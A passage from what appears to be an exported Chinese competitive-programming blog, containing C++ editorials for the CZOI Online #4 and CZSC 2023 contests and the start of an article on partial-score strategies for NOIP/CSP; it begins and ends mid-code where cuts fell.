read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint n,m;\nint a[_],s[_],w[_],sub[_],po[_];\n\ninline int copy(int y,int p){\n\tif(p>m) return y;\n\treturn (po[m-p+1]*y%mod+sub[p])%mod;\n}\n\nsigned main(){\n\t//freopen(\".in\",\"r\",stdin);\n\t//freopen(\".out\",\"w\",stdout);\n\tn=read(),m=read();\n\tfor(int i=1;i<=n;i++) a[i]=read(),s[1]+=a[i],s[1]%=mod;\n\tfor(int i=2;i<=m;i++) s[i]=s[i-1]*2%mod;\n\tw[1]=n,po[0]=1;\n\tfor(int i=2;i<=m;i++) w[i]=w[i-1]*2%mod;\n\tfor(int i=1;i<=m;i++) po[i]=po[i-1]*2%mod;\n\tsub[m]=w[m]*s[m]%mod;\n\tfor(int i=m-1;i>=1;i--){\n\t\tsub[i]=(po[m-i]*w[i]%mod*s[i]%mod+sub[i+1])%mod;\n\t}\n\n\tint now=0;\n\tfor(int i=1;i<=n;i++){\n\t\tnow+=(n-i+1)*a[i]%mod,now%=mod;\n\t}\n\n\tint ans=copy(now,1);\n\tint y=now,len=n,x=s[1];\n\tfor(int i=1;i<=m;i++){\n\t\tint tmp=(2*len%mod+1)*x%mod;\n\t\tans=max(ans,copy(tmp,i+1));\n\t\ty=(x*len%mod+2*y%mod)%mod;\n\t\tx=x*2%mod;\n\t\tlen=len*2%mod;\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n事实上你大概率是看不懂这个代码的，毕竟是推出式子来再写的代码。每个人可能最后计算的思路不同。所以仅供参考。\n\n**小结**\n\n- 本题实际上是来自CCPC2022桂林站的C题，链接：https://codeforces.com/gym/104008/problem/C 。同时也有更官方题解：https://codeforces.com/gym/104008/attachments/download/17654/2022_ccpc_guilin_solution.pdf 。较本题解缺少了一些思路的引导（毕竟参加CCPC的都是大佬）\n\n- 出本题的目的实际上是想告诉大家，真正比赛的时候往往是一眼看不出正解的。你需要根据测试点的特殊性质，一步步去接近正解。这一点在NOIP2022的T1和T2都有所体现。\n\n- 有一些题可能需要挖掘题目中的特殊性质。希望各位在后期的练习中能领悟到这一点。\n\n- 有一些题在解决的过程中需要考虑每个元素的“贡献”。如本题，我们不是直接看 $b_i$ 这个整个的序列，而是考虑每个元素对最后答案的影响，即“贡献”\n\n**相关练习**\n\n部分分引导正解\n\n1. [NOIP2022] 种花 https://www.luogu.com.cn/problem/P8865\n\n2. [NOIP2022] 喵了个喵 https://www.luogu.com.cn/problem/P8866\n\n考虑“贡献”\n\n1. DFS 序 3，树上差分 1 https://loj.ac/p/146\n\n2. DFS 序 4 https://loj.ac/p/147\n\n3. [CSP-S2019 江西] 多叉堆 https://www.luogu.com.cn/problem/P5689\n\n4. [NOIP2021] 数列 https://www.luogu.com.cn/problem/P7961\n\n## T2 paint\n\n参加过NOI春季测试的同学可能一眼发现这个题和这场比赛的T1非常相似。实际上本题可以视为那个题的加强版，原题的做法无法解决本题。\n\n说句题外话，当时出题人本人就在考场上把那个题看成了这个题，而且加上某个地方细节出了问题，调了2.5h最后又因为燕山大学电脑的fc有问题，导致自以为没通过大样例。比赛快结束的时候最后无奈又加了个暴力，然后一紧张特盘判反了，导致与暴力同分。并且本题浪费了2.5h导致整个比赛节奏打乱，最后与一等无缘。希望大家吸取教训。\n\n首先本题的数据输入有点复杂。聪明人应该学会直接把下发文件中的show.cpp中的代码借用过来。\n\n暴力可以通过subtask0，获得10pts。\n\n对于subtask1，可以使用线段树区间推平。这个应该是课上讲过的，不会的需要反思了。\n\n实际上还有一种方法解决这种区间推平问题。我个人将其称之为“并查集快速跳过”，这个应该也是课上讲过的。当时有道例题：\n\nP2391 白雪皑皑 https://www.luogu.com.cn/problem/P2391\n\n这个题就是本题思路的一个来源。\n\n各位没做过这道题的可以先做这道题，然后再继续往下看。\n\n然后subtaks2就是二维的情况。\n\n实际上二维情况就是多个一维，所以将一个操作拆分成若干个单行操作，循环行数，即“一行一行的涂”即可。\n\n但很显然这个题没有这么简单。比如如果只有一列，有若干行，上述方法和暴力没有区别。所以我们判断，如果行数多就一列一列地涂，如果列数多就一行一行地涂。这样复杂度就降下来了。并且因为行数和列数的乘积，即格子的个数受到限制，所以“枚举”这一操作，最多要循环 $\\sqrt{n\\times m}$ 次行或者列。为了做到这一点，还需要维护一个并查集。\n\n此外，在验题的时候，仍然倒序操作，开一个数组，记录当前方格指向的下一个没有涂色的方格，然后暴力涂色，但涂完就跳到下一个没有涂色的方格，而不是再一个一个判断。这种做法和并查集做法的区别在于这种做法没有路径压缩，因此可以被特殊构造的数据卡过去，因此就有了本题十分变态的数据读入。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 10000007\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)) res=(res<<3)+(res<<1)+(ch-'0'),ch=getchar();\n\treturn res*f;\n}\n\nstruct DataMaker{\n\tint n,m,q=0,A,B,C,D,E,F,G,H,T,J[5],K=5;\n\tDataMaker(int _n,int _m,int a,int b,int c,int d,int e,int f,int g,int h,int t){T=t,n=_n,m=_m,A=a,B=b,C=c,D=d,E=e,F=f,G=g,H=h;}\n\tinline int read(){\n\t\tif(K<=4) return J[K++];\n\t\telse{\n\t\t\tif(q<T) q++,J[1]=((A*q+B)%n+n)%n+1,J[2]=((B*q+A)%m+m)%m+1,J[3]=((C*q+D)%n+n)%n+1,J[4]=((D*q+C)%m+m)%m+1,K=1;\n\t\t\telse q++,J[1]=((E*q+F)%n+n)%n+1,J[2]=((F*q+E)%m+m)%m+1,J[3]=((G*q+H)%n+n)%n+1,J[4]=((H*q+G)%m+m)%m+1,K=1;\n\t\t\treturn J[K++];\n\t\t}\n\t}\n};\n\nstruct U{\n\tint fa[_],n;\n\tvoid init(int nn){n=nn;for(int i=1;i<=n;i++) fa[i]=i;}\n\tinline int find(int x){while(x!=fa[x]) x=fa[x]=fa[fa[x]];return x;}\n}u1,u2;\nstruct O{int x1,y1,x2,y2,c;} qq[_];\nint n,m,q,ans[_];\n\ninline int ax2n(int x,int y){\n\tif(x>n||y>m) return 0;\n\treturn (x-1)*m+y;\n}\ninline int n2x(int x){\n\tif(x%m) return x/m+1;\n\telse return x/m;\n}\ninline int n2y(int x){\n\tif(x%m) return x%m;\n\telse return m;\n}\n\ninline void paint1(int x,int l,int r,int c){\n\tint np=u1.find(ax2n(x,l));\n\tif(np==0) return;\n\tint nx=n2x(np),ny=n2y(np);\n\twhile(ny<=r){\n\t\tans[np]=c;\n\t\tu1.fa[u1.find(np)]=u1.fa[u1.find(ax2n(nx,ny+1))];\n\t\tu2.fa[u2.find(np)]=u2.fa[u2.find(ax2n(nx+1,ny))];\n\t\tif(ny==r) break;\n\t\tny++;\n\t\tnp=u1.find(ax2n(nx,ny));\n\t\tif(np==0) break;\n\t\tny=n2y(np);\n\t}\n}\n\ninline void paint2(int x,int l,int r,int c){\n\tint np=u2.find(ax2n(l,x));\n\tif(np==0) return;\n\tint nx=n2x(np),ny=n2y(np);\n\twhile(nx<=r){\n\t\tans[np]=c;\n\t\tif(nx==r){\n\t\t\tu1.fa[u1.find(np)]=u1.fa[u1.find(ax2n(nx,ny+1))];\n\t\t\tu2.fa[u2.find(np)]=u2.fa[u2.find(ax2n(nx+1,ny))];\n\t\t\tbreak;\n\t\t}\n\t\tu1.fa[u1.find(np)]=u1.fa[u1.find(ax2n(nx,ny+1))];\n\t\tu2.fa[u2.find(np)]=u2.fa[u2.find(ax2n(nx+1,ny))];\n\t\tnx++;\n\t\tnp=u2.find(ax2n(nx,ny));\n\t\tif(np==0) break;\n\t\tnx=n2x(np);\n\t}\n}\n\nvoid subtask(){\n\tn=read(),m=read(),q=read();\n\tint A=read(),B=read(),C=read(),D=read(),E=read(),F=read(),G=read(),H=read(),T=read();\n\tDataMaker obj(n,m,A,B,C,D,E,F,G,H,T);\n\tfor(int i=1;i<=q;i++){\n\t\tint x1=obj.read(),y1=obj.read(),x2=obj.read(),y2=obj.read();\n\t\tif(x1>x2) swap(x1,x2);\n\t\tif(y1>y2) swap(y1,y2);\n\t\tqq[i].x1=x1,qq[i].y1=y1,qq[i].x2=x2,qq[i].y2=y2,qq[i].c=i;\n\t}\n\tu1.init(n*m),u2.init(n*m);\n\tfor(int i=q;i>=1;i--){\n\t\tint x1=qq[i].x1,y1=qq[i].y1,x2=qq[i].x2,y2=qq[i].y2,c=qq[i].c;\n\t\tif(x2-x1<y2-y1) for(int j=x1;j<=x2;j++) paint1(j,y1,y2,c);\n\t\telse for(int j=y1;j<=y2;j++) paint2(j,x1,x2,c);\n\t}\n\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=m;j++){printf(\"%d \",ans[ax2n(i,j)]);}\n\t\tprintf(\"\\n\");\n\t}\n\n}\n\nsigned main(){\n\t//freopen(\"paint.in\",\"r\",stdin);\n\t//freopen(\"paint.out\",\"w\",stdout);\n\tint t=1;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n**小结**\n\n1. 本题实际上难度要大于T3。比赛难度不是严格的升序排列在CSP2022和NOIP2022中均有所体现，希望各位能注意到这点。不过有一点我想应该是不变的：最后一题肯定是最难的。当然有可能2023年打脸了。\n\n2. 希望各位能吸取我春季测试时的教训。多读题，不要把题目想复杂了。\n\n3. 本题涉及到并查集跳过的思想，这个比较常见，后面又给了例题各位可以再去体会体会。还有涉及到询问的倒序处理，即将询问或者操作离线下来。这个手法也是比较常见，尤其是在最小生成树那里。本题最后还涉及到一种和根号有关的优化，也不知道能不能称为“根号分治”，总之还是希望各位能学习一下这种思想。\n\n4. 本题还反映了各位的听课效果。实际上本题涉及到的并查集快速跳过和线段树区间推平都是课上讲过的。如果你忘记了，真的要反思一下。\n\n5. 下发文件中如果有cpp文件，其中的代码有时可能会对解题有所帮助，虽然noip和csp基本没下发过几次cpp文件。\n\n**相关练习**\n\n并查集快速跳过的又一个模板题\n\n1. Knight Tournament https://www.luogu.com.cn/problem/CF356A\n\n将询问/操作倒序处理\n\n1. [USACO18JAN] MooTube G https://www.luogu.com.cn/problem/P4185\n\n并查集用来跳过的思想\n\n1. [HEOI2016/TJOI2016] 树 https://www.luogu.com.cn/problem/P4092\n\n2. 「WHOI-2」彗星蜜月 https://www.luogu.com.cn/problem/P8431 （这一题中的某一步也可以用类似的，当然常数大了亿些，而且不是正解）\n\n## T3 game\n\n首先本题的“概率”的输入方式可能就对一些人产生了疑惑。对分数取模，实际上就是分子乘上分母的逆元。如果你逆元没学好，本题直接寄。\n\n首先注意，是两人相差 $d$，可以是Caiwen多也可以是明陌多。\n\n然后考虑Caiwen最多能有多少卡片（考虑明陌也是同理）\n\n我们设某一局时，Caiwen有 $x$ 个卡片，明陌有 $y$ 张卡片，则有 $x+y=m+n$\n\n当Caiwen比明陌多 $d$ 张卡片使游戏结束时，$x-y=d$ 解得 $x=(m+n+d)/2$，将这个值记为 $up$\n\n当明陌比Caiwen多 $d$ 张卡片使游戏结束时，$y-x=d$ 解得 $x=(m+n-d)/2$，将这个值记为 $down$\n\n上面算出来的两个 $x$ 值分别是Caiwen手上最多拥有和最少拥有的卡片，同时也是游戏结束时的条件\n\n这时候我们可以有个特判：当 $m+n+d$ 不能被2整除时，上述式子没有整数解。这种情况直接输出0，出题人好心，特意放置了几个为0的测试点，这样做可以得到15pts。当我们在比赛的时候，对于题目的特殊情况最好特判，一方面我们可以保证这些分数是稳拿的，另一方面，我们自己想出来的“正解”可能遗漏了特殊情况。\n\n因为本题的每一局就相当于dp的每一阶段，所以非常明显能看出使用dp\n\n我们设状态 $dp[i][j]$ 表示第 $i$ 局，Caiwen手上的卡片数量为 $j$ 时的概率。\n\n注意这里我们不设状态 $dp[i][j]$ 表示第 $i$ 局，Caiwen和明陌手上的卡片数量相差为 $j$ 时的概率。这样设计也可以，但是有可能 $j$ 为负数，我们需要把所有的 $j$ 加上一个固定的偏移量，但这样做非常容易错，所以不建议。\n\n开始时有 $dp[1][n]=1$\n\n答案为 $dp[N][up]+dp[N][down]$\n\n转移方程 $dp[i][j]=(dp[i-1][j]\\times p_0)+(dp[i-1][j+1]\\times p_2)+(dp[i-1][j-1]\\times p_1)$\n\n本题还有一些易错的地方\n\n- 注意不能转移一些状态。比如 $dp[i][down/up]$ 的状态是不能被转移的，因为已经满足了游戏结束的条件了\n\n- 注意本题的空间限制。直接 `int dp[6000][12003];` 是不行的。这时我们发现，每次的状态转移只跟上一个阶段的状态有关，和再往前的状态无关，所以我们考虑 01滚动数组优化\n\n参考代码\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=1000000007;\n\ninline int qpow(int a,int p,int res=1){for(;p;p>>=1,a=a*a%mod) if(p&1) res=res*a%mod;return res;}\nint N,n,m,p0,p1,p2,d;\nint up,down;\nint dp[2][12003];\n\nsigned main(){\n\tcin>>N>>n>>m>>p0>>p1>>p2>>d;\n\tif((m+n+d)&1){\n\t\tcout<<0;\n\t\treturn 0;\n\t}\n\tint up=(n+m+d)/2,down=(n+m-d)/2;\n\tint now=0;\n\tdp[now][n]=1;\n\tfor(int i=1;i<=N;i++){\n\t\tfor(int j=0;j<=m+n;j++){\n\t\t\tdp[1-now][j]=0;//别忘了清空！\n\t\t\tif(j+1<=m+n&&j+1!=up&&j+1!=down) dp[1-now][j]+=dp[now][j+1]*p2%mod;dp[1-now][j]%=mod;\n\t\t\tif(j!=up&&j!=down) dp[1-now][j]+=dp[now][j]*p0%mod;dp[1-now][j]%=mod;\n\t\t\tif(j-1>=0&&j-1!=up&&j-1!=down) dp[1-now][j]+=dp[now][j-1]*p1%mod;dp[1-now][j]%=mod;\n\t\t}\n\t\tnow=1-now;\n\t}\n\tcout<<(dp[now][up]+dp[now][down])%mod;\n\treturn 0;\n}\n```\n\n顺便一提 01滚动数组优化，可能有人不知道。如上述代码，一开始 `now=0`，当你 `now=1-now` 后，`now=1`，再来一遍 `now=1-now`，`now=0`，这样就实现了数组的来回切换。这是一个很常见的技巧。\n\n**小结**\n\n1. 本题实际上是dp里面非常套路的题目，没有什么难度。考虑到各位可能没怎么做过概率dp，所以就出了一道。如果你没有做出来这个题，说明你对dp的理解还比较欠缺。\n\n2. 本题的细节比较多，需要注意状态转移时的”边界“\n\n3. 注意特判掉一些特殊情况\n\n4. 注意dp的一些常见优化（当然单调队列优化，斜率优化这些省选内容没有时间就不要琢磨了）\n\n**相关练习**\n\n一道也是比较老套的期望dp\n\n1. [蓝桥杯 2022 省 A] 爬树的甲壳虫 https://www.luogu.com.cn/problem/P8774\n\n本题其实最开始想考察dp时，如果数组的下标可以取负数，此时就要加上一个”固定值“把下表变成正的。上述题解提了一嘴。下面是与此相关的一些题目。其中第二题涉及到”同余“，感兴趣的还可以了解一下”同余最短路“\n\n2. P1282 多米诺骨牌 https://www.luogu.com.cn/problem/P1282\n\n3. P1356 数列的整除性 https://www.luogu.com.cn/problem/P1356\n\n4. Jury Compromise https://www.luogu.com.cn/problem/UVA323\n\n一道01滚动数组优化的题目\n\n5. FAOI-R1【A】Program of ln(x) 2025 https://www.luogu.com.cn/problem/T269289\n\n说起dp优化，这里我再推荐一个题，当然这个题拿满分还是比较困难的。我想说的不是这个题的正解，而是这个题的部分分\n\n这个题前6个点的dp是不难想的（这都想不出来那说明你真的不会dp），然后你发现有一维是没必要的，于是就去掉了，可以通过前9个点。当然你一上来就想到了这一步也没关系。\n\n重点是10-16这一部分，用到了一个类似于”单调性“的性质优化dp，因为你发现状态的转移具有单调性。这个具体可以自己去看洛谷上的题解。\n\n当然这个题正解就没必要考虑了，拿到64分就非常好了。\n\n6. [CSP-S2019] 划分 https://www.luogu.com.cn/problem/P5665\n\n紧接着我又想到了一个题，这个题的dp优化也是比较值得学习的。不过这道题一上来你需要能看出”一半“这个条件能给这道题带来什么特殊性质。实际上，如今的信竞题往往都需要根据题目的各种信息推出特殊性质，如同本场比赛的T1一样。\n\n7. [CSP-S2019] Emiya 家今天的饭 https://www.luogu.com.cn/problem/P5664\n\n## T4 center\n\n首先本题实际上是树的中心的模板题。在一本通的提高篇树形dp一节中有讲。  \n具体解法参考：\n\nhttps://www.caiwen.work/index.php/2022/11/22/326/\n\n树的中心一节。\n\n:::info 链接失效说明\n由于本博客经过多次迁移，上面的链接已经不可用。你可以尝试在本博客中搜索“树的中心”来找到相应的文章。\n:::\n\n如果你学树形dp的时候没见过这个东西，那说明你算法学的还不够详细。在我的博客中有一些noip前写的笔记，上面的内容我认为是比较全的，各位有时间可以去看一下，发现有没学过的点一定要去学，这些笔记没有多余的内容，都是noip会考到的。由于这些笔记是给自己看的，所以有些地方你可能看不懂，因此这些笔记最重要的是目录。可以结合本笔记和百度来学习。\n\n虽然这一题是个模板题，但各大oj上都没有相应可以评测的地方。acwing上有，但是是收费题目。所以就自己造了数据，出了一个这种题。\n\n你可能想要喷出题人竟然出了这么经典的原题，还放到T4。实际上NOIP2022的T4也是原题，所以出原题并且放在T4就合情合理了起来。\n\n实际上你没学过树的中心，本题的dp思路也是比较好的，但就是不好想到。\n\n**小结**\n\n1. noip和csp小概率会出原题，如noip2022。实际上noip2021的t3与codeforces上的一个题用到的结论类似。不过广泛刷题对大家来说要求较高。反正建议各位最起码看看题解，知道题大概怎么做，万一2023年又出原题了呢。\n\n2. 菊花图和链形的图是图论中两个经典的部分分，这两个特殊情况请各位务必在时间允许的情况下拿到分数。\n\n","summary":"本篇文章是举行在2023年7月22日的 CZOI Online #4 的题解","key":["czoi"],"tags":[],"path":["算法竞赛","CZOI","CZOI Online #4 题解.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CZSC 2023 第二次 题解","id":"czsc2023-2-tijie","createTime":"2023-08-19T07:43:00.000Z","updateTime":"2025-09-05T13:34:06.371Z","content":"\n::: success 说明\n本篇文章是举行在2023年8月19日的 CZSC2023第二次 的题解\n\n比赛页：https://www.luogu.com.cn/contest/125635\n\nT1乘积：https://www.luogu.com.cn/problem/T367032\n\nT2命题：https://www.luogu.com.cn/problem/T369472\n\nT3报数：https://www.luogu.com.cn/problem/T366831\n\nT4数组：https://www.luogu.com.cn/problem/T368248\n:::\n\n## T1 乘积\n\n### 10pts\n\n很多人10分都没有拿到，这是不应该的。有一个部分分是x=0，这意味着两两相乘有几种情况最终答案就是多少。所以我们只需要输出 $n*(n-1)/2$ 即可得到10分\n\n### 100pts\n\n每次枚举两个数，计算出两个数的乘积，满足条件的话最后答案就+1\n\n**解法一**\n\n```cpp\n#include<iostream>\nusing namespace std;\nint arr[10004];\nint main(){\n\tint n,x,ans=0;\n\tcin>>n>>x;\n\tfor(int i=1;i<=n;i++) cin>>arr[i];\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=i+1;j<=n;j++){//注意，第二层的循环要从i+1开始。这样可以保证不重复\n\t\t\tint s=arr[i]*arr[j];\n\t\t\tint t=0;//末尾有几个零\n          //下面的代码是常见的把数字每一位都分割出来的操作\n\t\t\twhile(s){//这句话的意思是，如果s不为0的话就继续分割\n              //s%10可以把最后一位数字取出来，s/=10可以把最后一位数字删除\n\t\t\t\tif(s%10==0) t++,s/=10;\n\t\t\t\telse break;\n\t\t\t}\n\t\t\tif(t>=x) ans++;\n\t\t}\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n**解法二**\n\n这个解法是赛时很多同学想到的。思路是判断乘积能否被 $10^x$ 整除。这里给出袁浩宇同学的赛时代码：\n\n```cpp\n#include<iostream>\n#include<cmath>\nusing namespace std;\nint a[10010];\n\nint main(void){\n\tint n,x,ans = 0,c,d,e;\n\tcin>>n>>x;\n\td=pow(10,x);\n\tfor(int m = 0;m<n;m++){\n\t\tcin>>a[m];\n\t}\n\tfor(int i = 0;i<n;i++){\n\t\tfor(int j = i + 1;j<n;j++){\n\t\t\tc = a[i] * a[j];\n\t\t\te = c%d;\n\n\t\t\tif(e == 0){\n\t\t\t\tans++;\n\t\t\t}\n\t\t}\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n## T2 命题\n\nn和m都要取100，这样才能尽可能消耗时间。\n\n对于Code1和Code2，我们不难发现，如果给出的数据是从大到小排序的若干个数字，那么最后消耗的时间会很长。\n\n对于Code3，我们可以进行100次从1到100的染色过程。\n\n对于Code5，我们可以让100个操作都是给[100,100]涂色。这样代码最后枚举从1到99这些格子的时候，都会把这100个操作给过一遍，增加了消耗的时间。\n\n对于Code4，我们构造形如给[1,1]涂色、再给[1,2]涂色、再给[1,3]涂色...，这样的数据。这样代码设置的跳跃点并没有跳过很多的格子，换句话说，设置的跳跃点基本上是废掉了，因为到后面的操作，程序会从1，根据跳跃点跳到2，根据2的跳跃点再跳到3...\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint main(){\n\tint t;cin>>t;\n\tif(t==1||t==2){\n\t\tcout<<100<<endl;\n\t\tfor(int i=100;i>=1;i--){\n\t\t\tcout<<i<<' ';\n\t\t}\n\t}\n\tif(t==3){\n\t\tcout<<100<<' '<<100<<endl;\n\t\tfor(int i=1;i<=100;i++){\n\t\t\tcout<<\"1 100 1\"<<endl;\n\t\t}\n\t}\n\tif(t==4){\n\t\tcout<<100<<' '<<100<<endl;\n\t\tfor(int i=1;i<=100;i++){\n\t\t\tcout<<\"1 \"<<i<<\" 1\"<<endl;\n\t\t}\n\t}\n\tif(t==5){\n\t\tcout<<100<<' '<<100<<endl;\n\t\tfor(int i=1;i<=100;i++){\n\t\t\tcout<<\"100 100 1\"<<endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n## T3 报数\n\n根据第一题的解法一一样的思路，对每个数字进行拆分。对于一个不能被报出的数组，我们枚举这个数字的倍数。用数组记录下来那些数字是不能被报出来的。\n\n下面是吴海同同学的赛时代码\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nbool a[10001000];//记录一个数能否被报出，0为可以报出，1为不能被报出\nbool x(int i){//判断一个数是否含有7。返回0为存在，1为不存在\n\twhile(i){\n\t\tif(i%10==7){\n\t\t\treturn 0;\n\t\t}\n\t\ti/=10;\n\t}\n\treturn 1;\n}\nint main(){\n\tint n;\n\tcin>>n;\n\tfor(int i=1;i<10001000;i++){//先对10001000以内的数字全部进行判断\n\t\tif(a[i]==0 && x(i)==0){//如果枚举到的数字含有7，且没有被标记过\n\t\t\ta[i]=1;//进行标记\n\t\t\tfor(int j=1;i*j<=10001000;j++){//枚举倍数，其倍数也标记上\n\t\t\t\ta[i*j]=1;\n\t\t\t}\n\t\t}\n\t}\n  //然后从n+1开始，逐个判断\n\tfor(int i=n+1;i<10001000;i++){\n\t\tif(a[i]==0){\n\t\t\tcout<<i;\n\t\t\treturn 0;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n## T4 数组\n\n首先有个性质，对于一个数组，无论这个数组的数字有多少个，只有最小值和次小值是有用的。因为只有最小值才影响最后的答案，如果把最小值移走了，那么次小值影响最后答案。而且一个数组只能移走数字一次。\n\n还有一个性质，对于所有数组出现的所有的数字中最小的那个，无论这个数字有没有被移动，或者移动到了哪里，最后的答案一定会算上这个最小的数字。我们记这个最小的数字为 $minn$。\n\n假设 $minn$ 在数组 $i$ 中，那么最优的方案就是，除了数组 $i$ 以外的所有数组，都把它的最小值移动到数组 $i$ 中。这样他们的次小值就会被暴露出来，对答案产生贡献。而由于数组 $i$ 中有 $minn$，所以有数字移进来之后，不会对答案产生影响。\n\n```cpp\n#include<iostream>\n#define int long long\nusing namespace std;\n\nint arr[2][1003],n;\n\nsigned main(){\n\tcin>>n;\n\tint minn=10004;//最小值，因为题目中所有数字小于 10 的三次方，所以我们初始值设为比 10 的的三次方大的数字\n\tfor(int i=1;i<=n;i++){\n\t\tint m;\n\t\tcin>>m;\n\t\tint x1=10004,x2=10004;//x1为当前数组的最小值，x2为次小值\n\t\tfor(int j=1;j<=m;j++){\n\t\t\tint x;\n\t\t\tcin>>x;\n\t\t\tif(x<=x1) x2=x1,x1=x;\n\t\t\telse if(x<=x2) x2=x;\n\t\t\tif(x<minn) minn=x;\n\t\t}\n      //arr[0][]里面存的是最小值，1里面存的是次小值\n\t\tarr[0][i]=x1;\n\t\tarr[1][i]=x2;\n\t}\n\tint sum=0;\n\tfor(int i=1;i<=n;i++) sum+=arr[1][i];\n\t//sum为所有数组的次小值的加和\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){//枚举minn出现在那个数组中，找出一个最大情况\n\t\tans=max(ans,sum-arr[1][i]+minn);//如果出现在i数组中，那么i数组对答案的贡献是minn，而不是arr[1][i]\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n","summary":"本篇文章是举行在2023年8月19日的 CZSC2023第二次 的题解","key":["czoi"],"tags":[],"path":["算法竞赛","CZOI","CZSC 2023 第二次 题解.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"浅谈信息学竞赛中的骗分技巧","id":"noip-pianfen","createTime":"2023-08-13T10:00:00.000Z","updateTime":"2025-09-05T13:34:05.780Z","content":"\n## 前言\n\n由于信息学竞赛的特殊性：黑箱评测，只用有限的一些数据来判断选手的程序是否正确。再加上 CCF（Coin Collect Foundation） 用脚造数据，所以在 NOIp/CSP 中，如果事先了解一些骗分技巧，往往可以得到非常高的分数。\n\n在 OI 界已经有过名为《骗分导论》的论文，但作者个人认为该论文的骗分技巧不多，而且论文产生于若干年前，有点过时。因此本人想再写一篇类似《骗分导论》的文章，分享一些骗分技巧。\n\n由于作者个人水平有限，所以如果各位有其他的骗分技巧，也欢迎分享出来。你可以在评论区里回复你的技巧，我会把你分享的内容加入本文章中。本文章将持续更新。\n\n## 卡时\n\n在随机化算法中，如果我们不断地随机，那么得到的结果会越来越接近最后的正确答案。但过多地随机，就会使程序tle。我们可以在程序中对当前已经运行的时间进行判断，如果已经超时就不再进行随机。\n\n卡时往往与随机化算法结合会得到非常好的效果，我们在后面讲解一些随机化的做法时再细讲。\n\n下面给出一个卡时的例子。\n\n**例1: CSP-S 2022 T3 星战**  \n如果我们发现如果所有据点可以“连续穿梭”，则一定可以“实现反击”，那么本题的暴力就可以非常简单实现：\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 500005\n#define int long long\n#define ull unsigned long long\nusing namespace std;\nconst int mod=0;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nstruct Edge{int next,to;} edge[_];\nint out[_],head[_],size,ans;\ninline void adde(int u,int v){edge[++size].to=v,edge[size].next=head[u],head[u]=size;}\nset<int> tag[_];\ninline void del(int u,int v){\n\tif(tag[v].count(u)) return;\n\ttag[v].insert(u);\n\tint flag1=out[u];\n\tout[u]--;\n\tint flag2=out[u];\n\tif(flag1==1&&flag2!=1) ans--;\n\tif(flag1!=1&&flag2==1) ans++;\n}\ninline void add(int u,int v){\n\tif(tag[v].count(u)==0) return;\n\ttag[v].erase(u);\n\tint flag1=out[u];\n\tout[u]++;\n\tint flag2=out[u];\n\tif(flag1==1&&flag2!=1) ans--;\n\tif(flag1!=1&&flag2==1) ans++;\n}\n\nsigned main(){\n\tfreopen(\"galaxy.in\",\"r\",stdin);\n\tfreopen(\"galaxy.out\",\"w\",stdout);\n\tint n=read(),m=read();\n\tfor(int i=1;i<=m;i++){\n\t\tint u=read(),v=read();\n\t\tout[u]++;\n\t\tadde(v,u);\n\t}\n\tfor(int i=1;i<=n;i++) if(out[i]==1) ans++;\n\tint q=read();\n\twhile(q--){\n\t\tint t=read(),u,v;\n\t\tif(t==1||t==3) u=read(),v=read();\n\t\tif(t==2||t==4) u=read();\n\t\tif(t==1){\n\t\t\tdel(u,v);\n\t\t}else if(t==2){\n\t\t\tfor(int i=head[u];i;i=edge[i].next){\n\t\t\t\tdel(edge[i].to,u);\n\t\t\t}\n\t\t}else if(t==3){\n\t\t\tadd(u,v);\n\t\t}else{\n\t\t\tfor(int i=head[u];i;i=edge[i].next){\n\t\t\t\tadd(edge[i].to,u);\n\t\t\t}\n\t\t}\n\t\tif(ans==n) cout<<\"YES\"<<endl;\n\t\telse cout<<\"NO\"<<endl;\n\t}\n\treturn 0;\n}\n```\n\n可以得到 60 pts\n\n我们继续观察大样例，发现最终结果大部分都是 NO。对于最后几个数据规模较大，暴力肯定超时的点，我们与其tle，不如直接全输出NO。\n\n为了更好地发挥暴力算法的作用，我们可以这样做：执行暴力算法，程序卡时，快要超时就在后面全输出NO。\n\n```cpp\n\twhile(q--){\n\t\tif((double)clock()/CLOCKS_PER_SEC>1.8){\n\t\t\tprintf(\"NO\\n\");\n\t\t\tcontinue;\n\t\t}\n\t...\n}\n```\n\n在CCF的数据下可以得到80分。\n\n在这里值得一提的是，由于操作次数过多，所以会导致卡时不准。比如上述代码，卡时1.8s，实际测试点最大的运行时间达到了1.9s。如果直接卡1.9s，很可能与暴力同分。我们可以把最后全输出NO的情况单独拿出来写，具体如下\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 500005\n#define int long long\n#define ull unsigned long long\nusing namespace std;\nconst int mod=0;\n\ninline int 